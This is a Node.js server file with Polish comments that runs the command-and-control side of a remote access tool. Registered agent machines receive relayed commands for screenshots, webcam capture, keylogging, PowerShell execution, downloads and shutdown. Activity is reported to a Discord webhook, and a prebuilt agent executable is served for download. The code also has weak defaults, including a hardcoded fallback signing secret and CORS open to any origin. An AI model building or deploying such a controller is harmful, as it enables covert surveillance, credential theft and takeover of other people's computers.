require('dotenv').config();
const express = require('express');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const os = require('os');
const jwt = require('jsonwebtoken');
const session = require('express-session');
const auth = require('./auth');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const JWT_SECRET = process.env.JWT_SECRET || 'remote-control-secret-key-change-in-production';
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';

// Inicjalizacja systemu użytkowników
auth.initializeUsers();

// Funkcja wysyłania logów na Discord
async function sendDiscordLog(title, status, details = '', fields = []) {
  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.trim() === '') {
    return;
  }

  const embed = {
    title: `🖥️ ${title}`,
    color: status === 'success' ? 0x00ff00 : status === 'error' ? 0xff0000 : 0xffaa00,
    fields: [
      {
        name: '⏰ Czas',
        value: new Date().toLocaleString('pl-PL'),
        inline: true
      },
      {
        name: '📊 Status',
        value: status === 'success' ? '✅ Sukces' : status === 'error' ? '❌ Błąd' : '⚠️ Info',
        inline: true
      },
      ...fields
    ],
    timestamp: new Date().toISOString()
  };

  if (details) {
    embed.fields.push({
      name: '📝 Szczegóły',
      value: details.substring(0, 1024),
      inline: false
    });
  }

  const payload = JSON.stringify({
    embeds: [embed]
  });

  const webhookUrl = new URL(DISCORD_WEBHOOK);
  const protocol = webhookUrl.protocol === 'https:' ? https : http;

  const options = {
    hostname: webhookUrl.hostname,
    path: webhookUrl.pathname + webhookUrl.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  return new Promise((resolve) => {
    const req = protocol.request(options, (res) => {
      resolve();
    });

    req.on('error', () => {
      resolve();
    });

    req.write(payload);
    req.end();
  });
}

app.use(cors({
  origin: true,
  credentials: true
}));
app.use(express.json());
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 } // 24h
}));

// Middleware autoryzacji
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Brak tokenu autoryzacyjnego' });
  }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Nieprawidłowy token' });
    }
    req.user = user;
    next();
  });
}

// Middleware sprawdzający czy użytkownik jest rootem
function requireRoot(req, res, next) {
  if (req.user.role !== 'root') {
    return res.status(403).json({ error: 'Wymagane uprawnienia administratora' });
  }
  next();
}

// Serwowanie plików do pobrania
app.use('/downloads', express.static(path.join(__dirname, '..', 'remote-agent', 'dist')));

// Przechowywanie połączonych komputerów i klientów webowych
const computers = new Map(); // id -> {ws, name, info}
const webClients = new Map(); // ws -> {username, role}

wss.on('connection', (ws) => {
  // Nowe połączenie WebSocket
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      switch(data.type) {
        case 'register_computer':
          // Komputer rejestruje się w systemie
          const computerId = data.id || uuidv4();
          computers.set(computerId, {
            ws: ws,
            name: data.name || 'Unknown Computer',
            info: data.info || {},
            id: computerId
          });
          ws.computerId = computerId;
          ws.isComputer = true;
          
          console.log(`✓ Komputer połączony: ${data.name}`);
          
          // Log połączenia do Discord
          sendDiscordLog(
            '🟢 Nowy komputer w systemie',
            'success',
            '',
            [
              { name: '💻 Nazwa', value: data.name || 'Unknown', inline: true },
              { name: '🆔 ID', value: computerId.substring(0, 8), inline: true },
              { name: '🖥️ System', value: `${data.info?.platform || 'unknown'} ${data.info?.arch || ''}`, inline: true }
            ]
          );
          
          ws.send(JSON.stringify({
            type: 'registered',
            id: computerId
          }));
          
          // Powiadom klientów webowych o nowym komputerze
          broadcastToWebClients({
            type: 'computer_list_update',
            computers: getComputersList()
          });
          break;
          
        case 'register_webclient':
          // Klient webowy rejestruje się z tokenem
          if (!data.token) {
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Brak tokenu autoryzacyjnego'
            }));
            ws.close();
            return;
          }
          
          // Weryfikuj token
          try {
            const decoded = jwt.verify(data.token, JWT_SECRET);
            ws.isWebClient = true;
            ws.username = decoded.username;
            ws.role = decoded.role;
            webClients.set(ws, { username: decoded.username, role: decoded.role });
            
            // Wyślij listę dostępnych komputerów
            ws.send(JSON.stringify({
              type: 'computer_list',
              computers: getComputersList(),
              user: { username: decoded.username, role: decoded.role }
            }));
          } catch (error) {
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Nieprawidłowy token'
            }));
            ws.close();
          }
          break;
          
        case 'command':
          // Klient webowy wysyła komendę do komputera
          const targetComputer = computers.get(data.targetId);
          if (targetComputer && targetComputer.ws.readyState === WebSocket.OPEN) {
            targetComputer.ws.send(JSON.stringify({
              type: 'command',
              command: data.command,
              params: data.params || {}
            }));
            
            // Log wykonania komendy do Discord
            const commandNames = {
              'screenshot': '📸 Screenshot',
              'webcam': '📷 Webcam',
              'keylogger': '⌨️ Keylogger',
              'powershell': '💻 PowerShell',
              'download': '📥 Download',
              'info': 'ℹ️ Info',
              'shutdown': '🔴 Shutdown',
              'restart': '🔄 Restart',
              'lock': '🔒 Lock',
              'processes': '📊 Procesy',
              'kill-process': '❌ Kill Process'
            };
            
            sendDiscordLog(
              `⚡ Wykonano komendę: ${commandNames[data.command] || data.command}`,
              'info',
              '',
              [
                { name: '👤 Użytkownik', value: ws.username || 'unknown', inline: true },
                { name: '💻 Komputer', value: targetComputer.name, inline: true },
                { name: '🆔 ID', value: data.targetId.substring(0, 8), inline: true },
                { name: '📝 Komenda', value: data.command, inline: false }
              ]
            );
            
            // Potwierdź wysłanie komendy
            ws.send(JSON.stringify({
              type: 'command_sent',
              targetId: data.targetId,
              command: data.command
            }));
          } else {
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Komputer niedostępny'
            }));
          }
          break;
          
        case 'command_result':
          // Komputer zwraca wynik wykonania komendy
          broadcastToWebClients({
            type: 'command_result',
            computerId: ws.computerId,
            success: data.success,
            message: data.message,
            command: data.command
          });
          break;
      }
    } catch (error) {
      console.error('Błąd przetwarzania wiadomości:', error);
    }
  });
  
  ws.on('close', () => {
    if (ws.isComputer && ws.computerId) {
      const computerName = computers.get(ws.computerId)?.name || 'Unknown';
      console.log(`○ Komputer rozłączony: ${computerName}`);
      
      // Log rozłączenia do Discord
      sendDiscordLog(
        '🔴 Komputer rozłączony',
        'warning',
        '',
        [
          { name: '💻 Nazwa', value: computerName, inline: true },
          { name: '🆔 ID', value: ws.computerId.substring(0, 8), inline: true }
        ]
      );
      
      computers.delete(ws.computerId);
      
      // Powiadom klientów webowych
      broadcastToWebClients({
        type: 'computer_list_update',
        computers: getComputersList()
      });
    } else if (ws.isWebClient) {
      webClients.delete(ws);
      // Klient webowy rozłączony
    }
  });
  
  ws.on('error', (error) => {
    console.error('WebSocket error:', error);
  });
});

function getComputersList() {
  return Array.from(computers.values()).map(comp => ({
    id: comp.id,
    name: comp.name,
    info: comp.info
  }));
}

function broadcastToWebClients(data) {
  const message = JSON.stringify(data);
  webClients.forEach((userData, client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

// ===== AUTORYZACJA API =====

// Logowanie
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Brak nazwy użytkownika lub hasła' });
    }
    
    const user = await auth.authenticateUser(username, password);
    
    if (!user) {
      // Log nieudanego logowania
      sendDiscordLog(
        '🔐 Nieudane logowanie',
        'error',
        `Próba logowania: ${username}`,
        [
          { name: '🌐 IP', value: req.ip || 'unknown', inline: true }
        ]
      );
      return res.status(401).json({ error: 'Nieprawidłowa nazwa użytkownika lub hasło' });
    }
    
    // Log udanego logowania
    sendDiscordLog(
      '🔓 Udane logowanie',
      'success',
      '',
      [
        { name: '👤 Użytkownik', value: username, inline: true },
        { name: '🎭 Rola', value: user.role, inline: true },
        { name: '🌐 IP', value: req.ip || 'unknown', inline: true }
      ]
    );
    
    // Generuj JWT token
    const token = jwt.sign(
      { username: user.username, role: user.role },
      JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    res.json({
      success: true,
      token,
      user: {
        username: user.username,
        role: user.role,
        lastLogin: user.lastLogin
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Weryfikacja tokenu
app.get('/api/auth/verify', authenticateToken, (req, res) => {
  res.json({ 
    valid: true, 
    user: req.user 
  });
});

// Wylogowanie
app.post('/api/auth/logout', (req, res) => {
  res.json({ success: true, message: 'Wylogowano pomyślnie' });
});

// ===== ZARZĄDZANIE UŻYTKOWNIKAMI (tylko root) =====

// Lista użytkowników
app.get('/api/users', authenticateToken, requireRoot, (req, res) => {
  try {
    const users = auth.getUsersList();
    res.json({ users });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Dodaj użytkownika
app.post('/api/users', authenticateToken, requireRoot, async (req, res) => {
  try {
    const { username, password, role } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Brak nazwy użytkownika lub hasła' });
    }
    
    const newUser = await auth.addUser(username, password, role || 'user');
    res.json({ success: true, user: newUser });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Usuń użytkownika
app.delete('/api/users/:username', authenticateToken, requireRoot, (req, res) => {
  try {
    const { username } = req.params;
    auth.deleteUser(username);
    res.json({ success: true, message: `Użytkownik ${username} został usunięty` });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Zmień hasło użytkownika
app.put('/api/users/:username/password', authenticateToken, requireRoot, async (req, res) => {
  try {
    const { username } = req.params;
    const { password } = req.body;
    
    if (!password) {
      return res.status(400).json({ error: 'Brak nowego hasła' });
    }
    
    await auth.changePassword(username, password);
    res.json({ success: true, message: `Hasło dla ${username} zostało zmienione` });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Zmień własne hasło
app.put('/api/auth/change-password', authenticateToken, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    
    if (!currentPassword || !newPassword) {
      return res.status(400).json({ error: 'Brak obecnego lub nowego hasła' });
    }
    
    // Weryfikuj obecne hasło
    const user = await auth.authenticateUser(req.user.username, currentPassword);
    if (!user) {
      return res.status(401).json({ error: 'Nieprawidłowe obecne hasło' });
    }
    
    await auth.changePassword(req.user.username, newPassword);
    res.json({ success: true, message: 'Hasło zostało zmienione' });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// ===== REST API endpoints =====
app.get('/api/computers', authenticateToken, (req, res) => {
  res.json(getComputersList());
});

app.post('/api/computers/:id/rename', authenticateToken, (req, res) => {
  const { id } = req.params;
  const { name } = req.body;
  
  if (!name || name.trim() === '') {
    return res.status(400).json({ error: 'Brak nowej nazwy' });
  }
  
  const computer = computers.get(id);
  if (!computer) {
    return res.status(404).json({ error: 'Komputer nie znaleziony' });
  }
  
  const oldName = computer.name;
  computer.name = name.trim();
  
  // Log zmiany nazwy do Discord
  sendDiscordLog(
    '✏️ Zmiana nazwy komputera',
    'info',
    '',
    [
      { name: '👤 Użytkownik', value: req.user.username, inline: true },
      { name: '🔖 Stara nazwa', value: oldName, inline: true },
      { name: '🔖 Nowa nazwa', value: name.trim(), inline: true },
      { name: '🆔 ID', value: id.substring(0, 8), inline: true }
    ]
  );
  
  // Powiadom klientów webowych o zmianie
  broadcastToWebClients({
    type: 'computer_list_update',
    computers: getComputersList()
  });
  
  res.json({ success: true, name: computer.name });
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', computers: computers.size, clients: webClients.size });
});

// Endpoint do pobrania agenta (wymaga autoryzacji)
app.get('/api/download-agent', authenticateToken, (req, res) => {
  const agentPath = path.join(__dirname, '..', 'remote-agent', 'dist', 'RemoteControlAgent.exe');
  
  if (fs.existsSync(agentPath)) {
    res.download(agentPath, 'RemoteControlAgent.exe');
  } else {
    res.status(404).json({ 
      error: 'Agent nie został jeszcze zbudowany. Uruchom: cd remote-agent && npm run build' 
    });
  }
});

// Endpoint do generowania agenta z konfiguracją (wymaga autoryzacji)
app.post('/api/generate-agent', authenticateToken, (req, res) => {
  const { serverUrl, computerName } = req.body;
  
  if (!serverUrl) {
    return res.status(400).json({ error: 'Brak serverUrl' });
  }

  const agentPath = path.join(__dirname, '..', 'remote-agent', 'dist', 'RemoteControlAgent.exe');
  
  if (!fs.existsSync(agentPath)) {
    return res.status(404).json({ 
      error: 'Agent nie został jeszcze zbudowany. Uruchom: cd remote-agent && npm run build' 
    });
  }

  // Utwórz plik konfiguracyjny
  const config = {
    serverUrl: serverUrl,
    computerName: computerName || os.hostname(),
    reconnectInterval: 5000
  };

  const configPath = path.join(__dirname, '..', 'remote-agent', 'dist', 'config.json');
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));

  res.json({ 
    success: true, 
    message: 'Konfiguracja zapisana.',
    agentUrl: '/api/download-agent',
    configUrl: '/api/download-config'
  });
});

// Endpoint do pobrania konfiguracji (wymaga autoryzacji)
app.get('/api/download-config', authenticateToken, (req, res) => {
  const configPath = path.join(__dirname, '..', 'remote-agent', 'dist', 'config.json');
  
  if (fs.existsSync(configPath)) {
    res.download(configPath, 'config.json');
  } else {
    res.status(404).json({ error: 'Plik konfiguracyjny nie istnieje' });
  }
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`✓ Serwer uruchomiony pomyślnie`);
  console.log(`✓ System autoryzacji aktywny`);
  console.log(`✓ WebSocket server gotowy`);
  
  // Log uruchomienia serwera do Discord
  sendDiscordLog(
    '🚀 Serwer uruchomiony',
    'success',
    '',
    [
      { name: '🌐 Port', value: PORT.toString(), inline: true },
      { name: '🖥️ Host', value: os.hostname(), inline: true },
      { name: '⚙️ Node', value: process.version, inline: true }
    ]
  );
});
